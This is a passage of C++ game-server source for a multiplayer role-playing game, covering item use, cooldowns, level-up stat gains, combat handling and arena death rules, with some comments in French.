					backpack->Remove();
				}
			}
			else
			{
				done = TRUE;
			}
		}

	}
	backpack->Unlock();

	// if it wasn't found in the backpack
	if( !done )
	{
		// checks for any equiped spellbook
		int i;
		for(i = 0; i < EQUIP_POSITIONS; i++)
		{
			if(equipped[i])
			{
				if( equipped[i]->GetID() == which_item)
				{
					// if it is equiped, use it!
					lpuUnit = static_cast< Objects * >( equipped[i] );
					lpuUnit->SendUnitMessage(MSG_OnDisturbed, lpuUnit, this, TargetPlayer, &dwReason );
					if( lpuUnit->GetMark() & MARK_DELETION )
					{
						lpuUnit->DeleteUnit();
						equipped[ i ] = NULL;
					}
					else
					{
						done = TRUE;
						nWhere = i;
					}
				}
			}
		}
	}
	else
	{
		nWhere = 0xFFFF;
	}

	// If the item wasn't found in the equipment.
	if( !done )
	{
		return;
	}

   bool bCanExecute = true;
   for(int i=0;i<theApp.m_aDelayItems.GetSize();i++)
   {
      if(lpuUnit->GetStaticReference() == theApp.m_aDelayItems[i].uiID)
      {
         time_t tCurTime  =  time(NULL);
         time_t tLastTime =  ViewFlag(theApp.m_aDelayItems[i].uiFlag);
         if(tCurTime - tLastTime > theApp.m_aDelayItems[i].uiDelay)
         {
            SetFlag(theApp.m_aDelayItems[i].uiFlag,tCurTime);
            i = theApp.m_aDelayItems.GetSize();
         }
         else
         {
            CString strMessage;
            strMessage.Format(_STR( 15371, GetLang() ));
            SendSystemMessage(strMessage);
            bCanExecute = false;
            i = theApp.m_aDelayItems.GetSize();
         }
      }
   }
   if(!bCanExecute)
      return;
  

	DWORD itemUsed = 0;
	lpuUnit->SendUnitMessage(MSG_OnUse, lpuUnit, this, TargetPlayer, NULL, &itemUsed );

	// If the itemUsed flag wasn't set.
	if( itemUsed == 0 )
	{
		// Tell the user that using the item did nothing.
		TELL_PLAYER( 7683 );
	}

	// If unit must not be deleted.
	if( !( lpuUnit->GetMark() & MARK_DELETION ) )
	{
		return;
	}

	// Item must be removed from backpack
	if( nWhere == 0xFFFF )
	{
		// Find item
		backpack->Lock();
		backpack->ToHead();
		done = FALSE;
		while(backpack->QueryNext() && !done )
		{
			Objects *backpackItem = static_cast< Objects * >( backpack->Object() );

			// If object was found
			if( lpuUnit == backpackItem )
			{
				backpackItem->Remove();
				if( backpackItem->GetQty() == 0 )
				{
					// Remove item from backpack.                                
					backpack->Object()->DeleteUnit();
					backpack->Remove();
					lpuUnit = NULL;
				}

				done = TRUE;
			}
		}
		backpack->Unlock();

		// If backpack changed
		if( done )
		{
			if(lpuUnit && lpuUnit->GetQty()>0)
			{
				TFCPacket sending;
				sending << (RQ_SIZE)RQ_UpdateBackpackAfterUse;
				sending << (char)0;	
				sending << (long)GetID();


				sending << (short)lpuUnit->GetAppearance();
				sending << (long) lpuUnit->GetID();
				sending << (short)lpuUnit->GetStaticReference();
				sending << (long) lpuUnit->GetQty();

				// Only unique items may have charges.
				if( lpuUnit->IsUnique() )
				{
					sending << (long)lpuUnit->ViewFlag( __FLAG_CHARGES );
				}
				else
				{
					sending << (long)0;
				}
				SendPlayerMessage( sending );
			}
			else
			{
				// Update user's backpack.
				TFCPacket sending;
				sending << (RQ_SIZE)RQ_ViewBackpack2;
				sending << (char)0;	// Player may not want to view its backpack.
				sending << (long)GetID();
				PacketBackpack( sending );
				SendPlayerMessage( sending );
			}
			// Item must be removed from its equip position.
		}
	}
	else
	{
		// Delete the equipped item
		if( equipped[ nWhere ] != NULL )
		{
			lpuUnit = static_cast< Objects * >( equipped[ nWhere ] );
			equipped[ nWhere ] = NULL;
			lpuUnit->DeleteUnit();
		}           
	}
}

/******************************************************************************/
//  Uses an item according to its visual appearance.
bool Character::UseItemByAppearance(
                                    WORD wAppearance,		// The item's appearance.
                                    Unit *TargetPlayer		// Object's usage target.
                                    )
                                    /******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return false;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return FALSE;
   }

   DWORD dwReason = OBJECT_DISTURB_USE;
   bool boDestroyItem = false;

   Disturbed();//DC
   // If there is no backpack.
   if( backpack == NULL )
   {
      return false;
   }

   Objects *lpItem = NULL; // Item not found by default.

   backpack->Lock();
   backpack->ToHead();
   // Scroll through the backpack    
   while( backpack->QueryNext() && lpItem == NULL )
   {
      // If an item with the requested appearance is found.
      if( backpack->Object()->GetStaticReference() == wAppearance )
      {
         // Set it as the used item.
         lpItem = static_cast< Objects * >( backpack->Object() );
         lpItem->SendUnitMessage(MSG_OnDisturbed, lpItem, this, this, &dwReason );
         if( lpItem->GetMark() & MARK_DELETION )
         {				
            // Update the quantity.//DC
            lpItem->Remove();
            if( lpItem->GetQty() == 0 )
            {
               backpack->Object()->DeleteUnit();
               backpack->Remove();
               lpItem = NULL; //Add tio null this item was destroy and not exist...
            }
         }
         else
         {
            boDestroyItem = TRUE;
         }
      }
   }
   backpack->Unlock();

   if( lpItem != NULL )
   {        
      // Send an OnUse message.

      bool bCanExecute = true;
      for(int i=0;i<theApp.m_aDelayItems.GetSize();i++)
      {
         if(lpItem->GetStaticReference() == theApp.m_aDelayItems[i].uiID)
         {
            time_t tCurTime  =  time(NULL);
            time_t tLastTime =  ViewFlag(theApp.m_aDelayItems[i].uiFlag);
            if(tCurTime - tLastTime > theApp.m_aDelayItems[i].uiDelay)
            {
               SetFlag(theApp.m_aDelayItems[i].uiFlag,tCurTime);
               i = theApp.m_aDelayItems.GetSize();
            }
            else
            {
               CString strMessage;
               strMessage.Format(_STR( 15371, GetLang() ));
               SendSystemMessage(strMessage);
               bCanExecute = false;
               i = theApp.m_aDelayItems.GetSize();
            }
         }
      }
      if(!bCanExecute)
         return false;

      DWORD itemUsed = 0;
      lpItem->SendUnitMessage(MSG_OnUse, lpItem, this, TargetPlayer, NULL, &itemUsed );

      // If the itemUsed flag wasn't set.
      if( itemUsed == 0 )
      {
         // Tell the user that using the item did nothing.
         TELL_PLAYER( 7683 );
      }

      // If the OnUse message destroyed the item
      if( lpItem->GetMark() & MARK_DELETION )
      {
         boDestroyItem = true;
      }
      else
      {
         boDestroyItem = false;
      }

      bool done = false;
      if( boDestroyItem == true )
      {
         // Find item
         backpack->Lock();
         backpack->ToHead();
         while(backpack->QueryNext() && !done )
         {
            Objects *backpackItem = static_cast< Objects * >( backpack->Object() );
            // If object was found
            if( lpItem == backpackItem )
            {
               backpackItem->Remove();
               if( backpackItem->GetQty() == 0 )
               {
                  // Remove item from backpack.                                
                  backpack->Object()->DeleteUnit();
                  backpack->Remove();
                  lpItem = NULL;
               }

               if(lpItem && lpItem->GetQty()>0)
               {
                  TFCPacket sending;
                  sending << (RQ_SIZE)RQ_UpdateBackpackAfterUse;
                  sending << (char)0;	
                  sending << (long)GetID();


                  sending << (short)lpItem->GetAppearance();
                  sending << (long) lpItem->GetID();
                  sending << (short)lpItem->GetStaticReference();
                  sending << (long) lpItem->GetQty();

                  // Only unique items may have charges.
                  if( lpItem->IsUnique() )
                  {
                     sending << (long)lpItem->ViewFlag( __FLAG_CHARGES );
                  }
                  else
                  {
                     sending << (long)0;
                  }
                  SendPlayerMessage( sending );
               }
               else
               {
                  // Update backpack 
                  TFCPacket sending;
                  sending << (RQ_SIZE)RQ_ViewBackpack2;
                  sending << (char)0;	// Player may not want to view its backpack.
                  sending << (long)GetID();
                  PacketBackpack( sending );
                  SendPlayerMessage( sending );
               }

              

               done = true;

            }
         }
         backpack->Unlock();
      }
      else
         done = true;
      if(done == true )
         return true;
      
   }
   // Nothing found.
   return false;
}
/******************************************************************************/
// this function should return the ThisPlayer member of a Character (virtual)
Players *Character::GetPlayer()
{
   return ThisPlayer;
};
/******************************************************************************/
void Character::CheckIFLevelUP()
/******************************************************************************/
{
   try
   {
      if(theApp.dwEquilibrageNewCourbeXPEnable == 0) //XP Check if levelup
      {
         WORD wLevel = GetLevel();
         if(wLevel >= MAX_LEVEL_XP)
         {
            return;
         }
         else if( wLevel == 0 )
         {
            wLevel = 1;
         }

         if(sm_n64XPchart[wLevel] < GetXP())
         {
            // If level is under MAX_LEVEL_XP, gain a level!!
            if( wLevel < MAX_LEVEL_XP )
            {
               if(sm_n64XPchart[wLevel+1] >= GetXP())
               {
                  SetFlag(__FLAG_REROLL_BLOCK_LEVELUP,0);
               }
                  
               if(ViewFlag( __FLAG_FORCE_LEVELUP_REROLL ) ==1 || ViewFlag( __FLAG_REROLL_BLOCK_LEVELUP ) ==0)
               {
                  SetFlag(__FLAG_FORCE_LEVELUP_REROLL,0);
                  CString csReport;
                  CString csText;

                  // Set the value in Unit but do not echo the value until the end of the training
                  // session by using Character::SetLevel()
                  wLevel++;          			
                  Unit::SetLevel( wLevel );

                  csReport.Format( "Player %s gained a level! ( now level %u ).", (LPCTSTR)GetTrueName(), wLevel );

                  wNbStatPnts += 5;
                  wNbSkillPnts += (WORD)( m_bSkillPnt[ (WORD)wLevel / 10 ] );

                  csText.Format( "\r\n   Gained 5 stat points and %u skill points.", m_bSkillPnt[ (WORD)wLevel / 10 ] );
                  csReport += csText;

                  DWORD dwHPGain;

                  DWORD dwMaxHP = GetTrueMaxHP();          
                  DWORD dwHP = GetHP();

                  dwHPGain = rnd.roll( dice( 1, 3 ) ) + 5 + ( GetTrueEND() / 20 ); 

                  dwMaxHP += dwHPGain;
                  dwHP += dwHPGain;

                  csText.Format( "\r\n   Gained %u hit points. Now ( %u/%u )", dwHPGain, dwHP, dwMaxHP );
                  csReport += csText;

                  SetMaxHP( dwMaxHP );
                  SetHP( dwHP, true );

                  WORD wManaGain;
                  WORD wMaxMana = GetTrueMaxMana();
                  WORD wMana = GetMana();

                  wManaGain = rnd( 1, 3 ) + 2 + ( GetTrueINT() / 30 ) + ( GetTrueWIS() / 60 );

                  wMaxMana    += wManaGain;
                  wMana       += wManaGain;

                  csText.Format( "\r\n   Gained %u mana points. Now ( %u/%u )", wManaGain, wMana, wMaxMana );
                  csReport += csText;

                  SetMaxMana( wMaxMana );
                  SetMana( wMana );

                  tlusSkills[Hook_OnTraining].ToHead();
                  while(tlusSkills[Hook_OnTraining].QueryNext())
                  {
                     LPUSER_SKILL lpusUserSkill = tlusSkills[Hook_OnTraining].Object();
                     Skills::ExecuteSkill(lpusUserSkill->GetSkillID(), HOOK_TRAINING,this, NULL, NULL, NULL, NULL, lpusUserSkill);
                  }

                  _LOG_PC
                     LOG_MISC_1,
                     (char *)(LPCTSTR)csReport
                     LOG_

                  // Update the level and echo the change to the player and the group members.
                  SetLevel(wLevel);


                  //NMNMNM Add spell levelUP ici pour mettre server side...........

                  TFormat format;
                  SendSystemMessage( format(_STR(15035, GetLang()),  wLevel,
                     m_bSkillPnt[ (WORD)wLevel / 10 ],
                     dwHPGain,
                     dwHP,
                     dwMaxHP,
                     wManaGain,
                     wMana,
                     wMaxMana ), CL_ORANGE );

                  TRACE(_T("\r\nPlayer gained his level %u\r\n"), wLevel);
               }
            }
         }
      }
      else
      {
         WORD wLevel = GetLevel();
         if(wLevel >= MAX_LEVEL_XP)
         {
            return;
         }
         else if( wLevel == 0 )
         {
            wLevel = 1;
         }

         if(sm_n64XPchart[wLevel] < GetXP())
         {
            // If level is under MAX_LEVEL, gain a level!!
            if( wLevel < MAX_LEVEL_XP )
            {
               if(sm_n64XPchart[wLevel+1] >= GetXP())
               {
                  SetFlag(__FLAG_REROLL_BLOCK_LEVELUP,0);
               }

               if(ViewFlag( __FLAG_FORCE_LEVELUP_REROLL ) ==1 || ViewFlag( __FLAG_REROLL_BLOCK_LEVELUP ) ==0)
               {
                  SetFlag(__FLAG_FORCE_LEVELUP_REROLL,0);
                  CString csReport;
                  CString csText;

                  // Set the value in Unit but do not echo the value until the end of the training
                  // session by using Character::SetLevel()
                  wLevel++;          			
                  Unit::SetLevel( wLevel );

                  csReport.Format( "Player %s gained a level! ( now level %u ).", (LPCTSTR)GetTrueName(), wLevel );

                  wNbStatPnts += 5;
                  wNbSkillPnts += (WORD)( m_bSkillPnt[ (WORD)wLevel / 10 ] );

                  csText.Format( "\r\n   Gained 5 stat points and %u skill points.", m_bSkillPnt[ (WORD)wLevel / 10 ] );
                  csReport += csText;

                  DWORD dwHPGain;

                  DWORD dwMaxHP = GetTrueMaxHP();          
                  DWORD dwHP = GetHP();

                  dwHPGain = rnd.roll( dice( 1, 3 ) ) + 5 + ( GetTrueEND() / 20 ); 

                  dwMaxHP += dwHPGain;
                  dwHP += dwHPGain;

                  csText.Format( "\r\n   Gained %u hit points. Now ( %u/%u )", dwHPGain, dwHP, dwMaxHP );
                  csReport += csText;

                  SetMaxHP( dwMaxHP );
                  SetHP( dwHP, true );

                  WORD wManaGain;
                  WORD wMaxMana = GetTrueMaxMana();
                  WORD wMana = GetMana();

                  wManaGain = rnd( 1, 3 ) + 2 + ( GetTrueINT() / 30 ) + ( GetTrueWIS() / 60 );

                  wMaxMana    += wManaGain;
                  wMana       += wManaGain;

                  csText.Format( "\r\n   Gained %u mana points. Now ( %u/%u )", wManaGain, wMana, wMaxMana );
                  csReport += csText;

                  SetMaxMana( wMaxMana );
                  SetMana( wMana );

                  tlusSkills[Hook_OnTraining].ToHead();
                  while(tlusSkills[Hook_OnTraining].QueryNext())
                  {
                     LPUSER_SKILL lpusUserSkill = tlusSkills[Hook_OnTraining].Object();
                     Skills::ExecuteSkill(lpusUserSkill->GetSkillID(), HOOK_TRAINING,this, NULL, NULL, NULL, NULL, lpusUserSkill);
                  }

                  _LOG_PC
                     LOG_MISC_1,
                     (char *)(LPCTSTR)csReport
                     LOG_

                     // Update the level and echo the change to the player and the group members.
                     SetLevel(wLevel);

                  TFormat format;
                  SendSystemMessage( format(_STR(15035, GetLang()),  wLevel,
                     m_bSkillPnt[ (WORD)wLevel / 10 ],
                     dwHPGain,
                     dwHP,
                     dwMaxHP,
                     wManaGain,
                     wMana,
                     wMaxMana ), CL_ORANGE );

                  TRACE(_T("\r\nPlayer gained his level %u\r\n"), wLevel);
               }
            }
         }
      }
   }
   catch (...)
   {
      _LOG_DEBUG
         LOG_DEBUG_LVL1,
         "EXCEPTION--> Character::CheckIFLevelUP"
         LOG_
   }
}
/******************************************************************************/
int Character::attack(LPATTACK_STRUCTURE blow, Unit *Target)
/******************************************************************************/
{	
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return 1;
   }
   /// *****E_NMS_DEATH 

   ResetArenaINACTIF();


   // If this call is only a call to query the AttackSkill
   Disturbed(DISTURB_CLOSECHEST|DISTURB_CLOSETRADE);

   // Minimum of 500ms move and attack exhaust.
   DealExhaust( 500, 0, 500 );

   double  strike1 =  blow->Strike;
	

   blow->Strike += GAME_RULES::GetNaturalDamage(this);
   blow->lAttackSkill = GetATTACK();

   double  strike2 =  blow->Strike;

   // calculate precision here
   blow->Precision = GAME_RULES::GetBlowPrecision(blow->lAttackSkill, blow->lDodgeSkill, GetAGI(), Target->GetAGI() );

   int attackID;
   if(equipped[body])         equipped[body]        ->SendUnitMessage(MSG_OnAttack, equipped[body], this, Target, blow, &attackID);
   if(equipped[feet])         equipped[feet]        ->SendUnitMessage(MSG_OnAttack, equipped[feet], this, Target, blow, &attackID);
   if(equipped[gloves])       equipped[gloves]      ->SendUnitMessage(MSG_OnAttack, equipped[gloves], this, Target, blow, &attackID);
   if(equipped[helm])         equipped[helm]        ->SendUnitMessage(MSG_OnAttack, equipped[helm], this, Target, blow, &attackID);
   if(equipped[legs])         equipped[legs]        ->SendUnitMessage(MSG_OnAttack, equipped[legs], this, Target, blow, &attackID);
   if(equipped[belt])         equipped[belt]        ->SendUnitMessage(MSG_OnAttack, equipped[belt], this, Target, blow, &attackID);
   if(equipped[cape])         equipped[cape]        ->SendUnitMessage(MSG_OnAttack, equipped[cape], this, Target, blow, &attackID);
   if(equipped[ring1])        equipped[ring1]       ->SendUnitMessage(MSG_OnAttack, equipped[ring1], this, Target, blow, &attackID);	
   if(equipped[ring2])        equipped[ring2]       ->SendUnitMessage(MSG_OnAttack, equipped[ring2], this, Target, blow, &attackID);
   if(equipped[Orbe1])        equipped[Orbe1]       ->SendUnitMessage(MSG_OnAttack, equipped[Orbe1], this, Target, blow, &attackID);
   if(equipped[bracelets])    equipped[bracelets]   ->SendUnitMessage(MSG_OnAttack, equipped[bracelets], this, Target, blow, &attackID);
   if(equipped[necklace])     equipped[necklace]    ->SendUnitMessage(MSG_OnAttack, equipped[necklace], this, Target, blow, &attackID);
   if(equipped[weapon_right]) equipped[weapon_right]->SendUnitMessage(MSG_OnAttack, equipped[weapon_right], this, Target, blow, &attackID);		
   if(equipped[weapon_right] != equipped[weapon_left] )// if it's not a two handed weapon
   {
      if(equipped[weapon_left])
      {
         _item *obj = NULL;
         equipped[weapon_left ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &obj);
         if(obj && obj->item_type == 1 && obj->weapon.ranged == 0)
         {
            // on compte pas le strike ici des dual weapon, le skill comptera le degat...
         }
         else
         {
            equipped[weapon_left] ->SendUnitMessage(MSG_OnAttack, equipped[weapon_left], this, Target, blow, &attackID);
         }
      }
   }

   blow->Strike += QueryBoost( STAT_DAMAGE );

   double  strike3 =  blow->Strike;


	if( ((Character*)this)->GetGodFlags() & GOD_DEVELOPPER ) {

   		CString csMessage;
		csMessage.Format( "[\"attack\"] degats avant : %lf, dégat naturels : %lf, dégats finaux, %lf ", strike1, strike2, strike3);
		this->SendSystemMessage( csMessage );
	}

   // If the target isn't the attacker. Defensive purposes only.
   if( Target != this )
   {
      QueryEffects( MSG_OnAttack, blow, NULL, Target );
   }
   return 1; // attack ID 1
}

/******************************************************************************
int Character::attacked(LPATTACK_STRUCTURE blow, Unit *attacker)
/******************************************************************************/
int Character::attacked(LPATTACK_STRUCTURE blow, Unit *attacker)
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return 0;
   }
  
   ResetArenaINACTIF();


   /// *****E_NMS_DEATH 
   //blow->Strike -= (ViewFlag(__FLAG_END) / 15);
   WORD wDisturbedFlags = 0|DISTURB_CLOSECHEST|DISTURB_CLOSETRADE;
   if (theApp.dwRobWhileBeingAttackedEnabled) wDisturbedFlags |= DISTURB_DONTCANCELROB;
   Disturbed(wDisturbedFlags);

   // Call OnAttacked for all equipped objects.
   if(equipped[ring1])		equipped[ring1]		->SendUnitMessage(MSG_OnAttacked, equipped[ring1], this, attacker, blow, NULL);
   if(equipped[ring2])		equipped[ring2]		->SendUnitMessage(MSG_OnAttacked, equipped[ring2], this, attacker, blow, NULL);
   if(equipped[Orbe1])		equipped[Orbe1]		->SendUnitMessage(MSG_OnAttacked, equipped[Orbe1], this, attacker, blow, NULL);
   if(equipped[bracelets]) equipped[bracelets]	->SendUnitMessage(MSG_OnAttacked, equipped[bracelets], this, attacker, blow, NULL);
   if(equipped[necklace])	equipped[necklace]	->SendUnitMessage(MSG_OnAttacked, equipped[necklace], this, attacker, blow, NULL);
   if(equipped[body])		equipped[body]		->SendUnitMessage(MSG_OnAttacked, equipped[body], this, attacker, blow, NULL);
   if(equipped[belt])		equipped[belt]		->SendUnitMessage(MSG_OnAttacked, equipped[belt], this, attacker, blow, NULL);
   if(equipped[feet])		equipped[feet]		->SendUnitMessage(MSG_OnAttacked, equipped[feet], this, attacker, blow, NULL);
   if(equipped[gloves])	equipped[gloves]	->SendUnitMessage(MSG_OnAttacked, equipped[gloves], this, attacker, blow, NULL);
   if(equipped[helm])		equipped[helm]		->SendUnitMessage(MSG_OnAttacked, equipped[helm], this, attacker, blow, NULL);
   if(equipped[legs])		equipped[legs]		->SendUnitMessage(MSG_OnAttacked, equipped[legs], this, attacker, blow, NULL);
   if(equipped[cape])      equipped[cape]        ->SendUnitMessage(MSG_OnAttacked, equipped[cape], this, attacker, blow, NULL);
   // If item isn't a two handed weapon
   if( equipped[ weapon_right ] == equipped[ weapon_left ] )
   {
      if(equipped[ weapon_right ]) equipped[ weapon_right ]->SendUnitMessage(MSG_OnAttacked, equipped[ weapon_right ], this, attacker, blow, NULL);
   }
   else
   {
      // Otherwise query both hand positions for any shields.
      if(equipped[ weapon_right ]) equipped[ weapon_right ]->SendUnitMessage(MSG_OnAttacked, equipped[ weapon_right ], this, attacker, blow, NULL);
      if(equipped[ weapon_left ]) equipped[ weapon_left ]->SendUnitMessage  (MSG_OnAttacked, equipped[ weapon_left ],  this, attacker, blow, NULL);
   }

   // Deduct the player's AC from the blow.
   blow->Strike -= GetAC();
   // Strike cannot be < 0
   blow->Strike = blow->Strike < 0 ? 0 : blow->Strike;

   TRACE(_T("Player got attacked, Strike = %u\r\n"), blow->Strike);

   // Then process all attacked-intrinsic skills
   tlusSkills[Hook_OnAttacked].ToHead();

   while(tlusSkills[Hook_OnAttacked].QueryNext())
   {
      LPUSER_SKILL lpusUserSkill = tlusSkills[Hook_OnAttacked].Object();

      Skills::ExecuteSkill(lpusUserSkill->GetSkillID(), HOOK_ATTACKED,
         this, NULL, attacker, blow, NULL, lpusUserSkill);
   }

   // If the attacking unit isn't this character.
   if( attacker != this )
   {
      QueryEffects( MSG_OnAttacked, blow, NULL, attacker );
   }

   //	*strike = 0; // aren't we a bit powerfull eh? :)
   return 0;
}
/******************************************************************************/
// kills the player
void Character::DeathOld(Unit *WhoHit)
/******************************************************************************/
{
   const int LUCK_LIFE_SAVER = 1000;

   Players *lpPlayer = static_cast< Players * >( GetPlayer() );

   // If character is already dead or is a god which cannot die.
   if( IsDead() || ( lpPlayer->GetGodFlags() & GOD_CANNOT_DIE ) )
   {
      SetHP(0, true);
      return;
   }

   // If player isn't in-game.
   if( !lpPlayer->in_game )
   {
      SetHP(1, true);
      return;
   }

   if((lpPlayer->self->GetArenaID() >0 && lpPlayer->self->GetArenaTeam() >0) &&
      (lpPlayer->self->GetUnderBlockMap()   == __ARENAGAME_FULL_PVP    ||
      lpPlayer->self->GetUnderBlockMap()   == __ARENAGAME_BT_FULL_PVP  ||
      lpPlayer->self->GetUnderBlockMap()   == __ARENAGAME_RT_FULL_PVP     )    )
   {
      SetHP(1, true);

      WorldPos wlPlayerPos = GetWL();

      if(GetArenaID() > 0) //Valid selon type de jeux...
      {
         //1- incremente deadth number of this player
         SetArenaDead(GetArenaDead()+1);
         AddArenaPOINTS(-5,"Death penalty"); //(NM:Regle 2)


         //2- increse kill number ou assassin
         Character *targetChar = static_cast< Character * >( WhoHit );
         targetChar->SetArenaKill(targetChar->GetArenaKill()+1);
         targetChar->AddArenaPOINTS((int)(5*GetArenaPVP()),"Kill bonus"); //(NM:Regle 1)

         //decrease the arena PVP % 1==100% 0 == 0%
         AddArenaPVP(-0.20); //remove 20%
         ResetArenaINACTIF();
         targetChar->ResetArenaINACTIF();



         //3- in player have flag reset his TAG and drop the flag on ground...
         if(ViewFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG))
         {
            if(GetArenaID() >0)
            {
               if(GetArenaType() == ARENE1_TYPE)
                  Arena1Master::SummonFlag(GetArenaID()-1,wlPlayerPos.X,wlPlayerPos.Y,wlPlayerPos.world);
               else if(GetArenaType() == ARENE2_TYPE)
                  Arena2Master::SummonFlag(ViewFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG)-1,GetArenaID()-1,wlPlayerPos.X,wlPlayerPos.Y,wlPlayerPos.world);
            }

            SetFlag(__FLAG_NMS_TAG_DISPLAY_OVER_HEAD,0);
            SetFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG,0);

            AddArenaPOINTS(-10,"Lost flag"); //(NM:Regle 4)
         }



         SetHP(GetMaxHP(), true);
         SetMana(GetMaxMana(), true);

         CString strTmp;
         int iMessageID = rnd( 0, 9 );
         switch(iMessageID)
         {
         case 0: strTmp.Format(_STR(15450, GetLang()),GetTrueName() ,targetChar->GetTrueName()); break;
         case 1: strTmp.Format(_STR(15451, GetLang()),targetChar->GetTrueName(),GetTrueName()); break;
         case 2: strTmp.Format(_STR(15452, GetLang()),GetTrueName() ,targetChar->GetTrueName()); break;
         case 3: strTmp.Format(_STR(15453, GetLang()),GetTrueName() ,targetChar->GetTrueName()); break;
         case 4: strTmp.Format(_STR(15454, GetLang()),GetTrueName() ,targetChar->GetTrueName()); break;
         case 5: strTmp.Format(_STR(15455, GetLang()),targetChar->GetTrueName(),GetTrueName()); break;
         case 6: strTmp.Format(_STR(15456, GetLang()),targetChar->GetTrueName(),GetTrueName()); break;
         case 7: strTmp.Format(_STR(15457, GetLang()),targetChar->GetTrueName(),GetTrueName()); break;
         case 8: strTmp.Format(_STR(15458, GetLang()),GetTrueName() ,targetChar->GetTrueName()); break;
         case 9: strTmp.Format(_STR(15459, GetLang()),GetTrueName(),targetChar->GetTrueName()); break;
         default: strTmp.Format(_STR(15450, GetLang()),GetTrueName(),targetChar->GetTrueName()); break;
         }


         if(GetArenaType() == ARENE1_TYPE)
         {
            Arena1Master::RemTakeList(GetPlayer(),GetArenaID()-1);
            Teleport( Arena1Master::GetRecallDeathTeam(GetArenaTeam(),GetArenaID()-1), 1 ,TRUE);
            DealExhaust(0,0,Arena1Master::GetDeathWaitTimeMS(GetArenaID()-1));
            Arena1Master::SendMessageToAll(strTmp,CL_ORANGE, GetArenaID()-1);
         }
         else if(GetArenaType() == ARENE2_TYPE)
         {
            Arena2Master::RemTakeList(0,GetPlayer(),GetArenaID()-1);
            Arena2Master::RemTakeList(1,GetPlayer(),GetArenaID()-1);

            Teleport( Arena2Master::GetRecallDeathTeam(GetArenaTeam(),GetArenaID()-1), 1 ,TRUE);
            DealExhaust(0,0,Arena2Master::GetDeathWaitTimeMS(GetArenaID()-1));
            Arena2Master::SendMessageToAll(strTmp,CL_ORANGE, GetArenaID()-1);
         }
      }


      //partie cimetiere...

      CString Victime;
      CString Assassin;
      int     dwType = 0;

      Victime.Format("%s",GetTrueName());
      if( WhoHit != NULL )
      {
         if( WhoHit->GetType() == U_PC )
         {
            Character *targetChar = static_cast< Character * >( WhoHit );
            if( WhoHit == this )
               Assassin.Format("killed himself");
            else
            {
               Assassin.Format("%s",targetChar->GetPlayer()->self->GetTrueName());
               dwType = 1;
            }
         }
         else 
            Assassin.Format("%s",WhoHit->GetName( _DEFAULT_LNG ));
      }
      else
         Assassin.Format("some unknown unit");

      CT4CLog::SaveDeathLog(Victime,Assassin,dwType,1);

      return;
   }
 

   if(lpPlayer->self->GetUnderBlockMap()   == __FULL_PVP_CANNOT_REALLY_DIE_DROP_ORROB ||
      lpPlayer->self->GetUnderBlockMap()   == __FULL_PVP_CANNOT_REALLY_DIE_DROP_ORROB_CAST_SPELL )
   {
      SetHP(1, true);

      WorldPos wlPlayerPos = GetWL();

      // If player died in an Arena Location
      list< sArenaLocation >::iterator i;
      bool boFound = false;	
      for( i = theApp.arenaLocationList.begin(); i != theApp.arenaLocationList.end(); ++i )
      {
         // If player is in the same world as the current location
         if( wlPlayerPos.world == (*i).wlTopLeft.world )
         {
            // If player is in the good x range
            if( wlPlayerPos.X >= (*i).wlTopLeft.X && wlPlayerPos.X <= (*i).wlBottomRight.X )
            {
               // And if player is in the good y range
               if( wlPlayerPos.Y >= (*i).wlTopLeft.Y && wlPlayerPos.Y <= (*i).wlBottomRight.Y )
               {
                  // Player is in this kind of area!
                  boFound = true;					
                  break;
               }
            }
         }
      }

      if(boFound)
      {
         if( TFCMAIN::GetWorld( (*i).wlRecallTarget.world )->IsValidPosition( (*i).wlRecallTarget )  )
            Teleport( (*i).wlRecallTarget, 1 );
         else
            Teleport( wlDeathPos, 1 );

         if( TFCMAIN::GetWorld( (*i).wlRecallAttacker.world )->IsValidPosition( (*i).wlRecallAttacker ) && WhoHit != NULL )
            WhoHit->Teleport( (*i).wlRecallAttacker, 1 );
      }
      else
      {
         WorldPos wlPos;
         wlPos.X     = theApp.dwNDeadX;
         wlPos.Y     = theApp.dwNDeadY;
         wlPos.world = theApp.dwNDeadW;
         Teleport( wlPos, 0 );
      }

      CString Victime;
      CString Assassin;
      int     dwType = 0;

      Victime.Format("%s",GetTrueName());
      if( WhoHit != NULL )
      {
         if( WhoHit->GetType() == U_PC )
         {
            Character *targetChar = static_cast< Character * >( WhoHit );
            if( WhoHit == this )
               Assassin.Format("killed himself");
            else
            {
               Assassin.Format("%s",targetChar->GetPlayer()->self->GetTrueName());
               dwType = 1;
            }
         }
         else 
            Assassin.Format("%s",WhoHit->GetName( _DEFAULT_LNG ));
      }
      else
         Assassin.Format("some unknown unit");

      CT4CLog::SaveDeathLog(Victime,Assassin,dwType,1);
      return;
   }

 





   KillCreature();

   Lock();

   StopAutoCombat();
   CString Victime;
   CString Assassin;
   int     dwType;


   Players *thisPlayer = GetPlayer();

   Victime.Format("%s",GetTrueName());



   if( WhoHit != NULL )
   {
      // Creature who hit no longer is in combat
      WhoHit->SetTarget(WhoHit->GetBond());
	  WhoHit->Do(wandering,"DeathOld");

      if(theApp.m_dwDUELSyetemActif == 1) //DUEL SYSTEM
      {
         Players *NMtargetPlayer = NULL;
         if( WhoHit->GetType() == U_PC )
         {
            Character *NMtargetChar = static_cast< Character * >( WhoHit );
            NMtargetPlayer = NMtargetChar->GetPlayer();
         }

         if(theApp.ManageDuelSystem(lpPlayer,NMtargetPlayer))
         {
            SetHP(GetMaxHP()/10, true);
            Teleport( GetWL(), 1 );
            Unlock();

            return;
         }
      }


      if( WhoHit->GetType() == U_PC )
      {
         Character *targetChar = static_cast< Character * >( WhoHit );
         Players *targetPlayer = targetChar->GetPlayer();
         Players *pVictime     = GetPlayer();

